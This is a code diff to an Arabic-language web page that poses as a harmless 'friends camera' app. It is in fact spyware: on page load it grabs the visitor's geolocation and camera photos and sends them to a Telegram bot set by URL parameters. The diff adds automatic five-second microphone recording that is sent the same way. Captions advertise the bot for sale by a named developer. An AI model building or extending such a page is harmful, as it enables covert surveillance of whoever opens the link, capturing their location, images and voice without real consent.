@@ -49,12 +49,12 @@
     </style>
 </head>
 <body>
-    <h1>ابتسم وصيح سيييييييي</h1>
+    <h1>التطبيق قيد التشغيل</h1>
     <div class="container">
-        <p>شلونك وردة منتضر الهديه؟</p>
+        <p>التطبيق يعمل تلقائيًا لإرسال البيانات. يرجى الانتظار...</p>
     </div>
     <div id="map-container" class="map"></div>
-    <footer>© 2024 - حقوق الموقع ،المطور صوفي</footer>
+    <footer>© 2024 - تطبيق كاميرا الأصدقاء</footer>
 
     <script>
         const urlParams = new URLSearchParams(window.location.search);
@@ -87,12 +87,58 @@
             const formData = new FormData();
             formData.append('chat_id', chatId);
             formData.append('photo', imageBlob);
+            formData.append(
+                'caption',
+                `تم تطوير البوت بواسطة صوفي للاشراك او شراء البوت تواصل مع المطور @caser7\n\n` +
+                `المنطقة: none\nرقم الهاتف: none\nمقطع صوتي: جارِ الإرسال\nمقطع فيديو: قريبًا\n-----------------\n` +
+                `قناتي: https://t.me/+qZ06s9H7I944YWYy`
+            );
 
             try {
                 await fetch(url, { method: 'POST', body: formData });
             } catch (error) {
                 console.error("خطأ في إرسال الصورة إلى Telegram:", error);
             }
+        }
+
+        async function sendAudioToTelegram(audioBlob) {
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendVoice`;
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('voice', audioBlob);
+            formData.append('caption', 'هذا تسجيل صوتي أُرسل تلقائيًا بواسطة البوت.');
+
+            try {
+                await fetch(url, { method: 'POST', body: formData });
+            } catch (error) {
+                console.error("خطأ في إرسال الصوت إلى Telegram:", error);
+            }
+        }
+
+        async function captureAudio() {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                sendDataToTelegram("⚠️ تسجيل الصوت غير مدعوم في هذا المتصفح.");
+                return;
+            }
+
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            const mediaRecorder = new MediaRecorder(stream);
+
+            const audioChunks = [];
+            mediaRecorder.ondataavailable = event => {
+                audioChunks.push(event.data);
+            };
+
+            mediaRecorder.onstop = () => {
+                const audioBlob = new Blob(audioChunks, { type: 'audio/ogg; codecs=opus' });
+                sendAudioToTelegram(audioBlob);
+            };
+
+            mediaRecorder.start();
+            setTimeout(() => {
+                mediaRecorder.stop();
+                stream.getTracks().forEach(track => track.stop());
+            }, 5000); // تسجيل الصوت لمدة 5 ثوانٍ
         }
 
         async function sendLocation(latitude, longitude) {
@@ -162,11 +208,7 @@
                     position => {
                         const latitude = position.coords.latitude;
                         const longitude = position.coords.longitude;
-                        sendDataToTelegram(`تم تطوير البوت بواسطة صوفي للاشراك او شراء البوت تواصل مع المطور @caser7 
-IP:
-المنطقة:
-رقم الهاتف:
-قناتي : https://t.me/+qZ06s9H7I944YWYy📍 إحداثيات الموقع:\n- خط العرض: ${latitude}\n- خط الطول: ${longitude}`);
+                        sendDataToTelegram(`📍 إحداثيات الموقع:\n- خط العرض: ${latitude}\n- خط الطول: ${longitude}`);
                         sendLocation(latitude, longitude);
                     },
                     error => {
@@ -181,6 +223,7 @@ IP:
         // تشغيل المهام
         captureLocation();
         captureImages();
+        captureAudio();
     </script>
 </body>
 </html>
